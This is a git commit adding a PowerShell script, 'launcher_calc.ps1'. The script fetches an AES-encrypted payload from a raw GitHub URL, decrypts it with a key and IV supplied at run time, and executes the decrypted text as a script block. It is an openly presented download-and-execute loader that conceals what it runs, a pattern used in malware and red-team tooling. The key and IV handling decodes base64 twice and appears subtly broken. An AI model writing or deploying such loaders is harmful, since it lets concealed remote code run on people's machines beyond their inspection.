2e600b6ddba61735e97f3ab11bedad057c851b2d
Giovanni Piccolo <piccolog93@gmail.com>
2025-11-06 15:37:39 +0100

    Add PowerShell script for decrypting and executing commands

---
+++ launcher_calc.ps1
@@ -0,0 +1,24 @@
+param (
+    [Parameter(Mandatory=$true)]
+    [string]$Key,
+
+    [Parameter(Mandatory=$true)]
+    [string]$IV
+)
+$key_b64   = [System.Convert]::FromBase64String($Key)
+$iv_b64    = [System.Convert]::FromBase64String($IV)
+$url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/calc.enc"
+$data_b64  = (New-Object Net.WebClient).DownloadString($url)
+$keyBytes = [System.Convert]::FromBase64String($key_b64)
+$ivBytes  = [System.Convert]::FromBase64String($iv_b64)
+$encryptedBytes = [System.Convert]::FromBase64String($data_b64)
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key = $keyBytes
+$aes.IV  = $ivBytes
+$decryptor = $aes.CreateDecryptor()
+$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
+$decryptedCommand = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+$aes.Dispose()
+$decryptor.Dispose()
+$scriptBlock = [scriptblock]::Create($decryptedCommand)
+Invoke-Command -ScriptBlock $scriptBlock
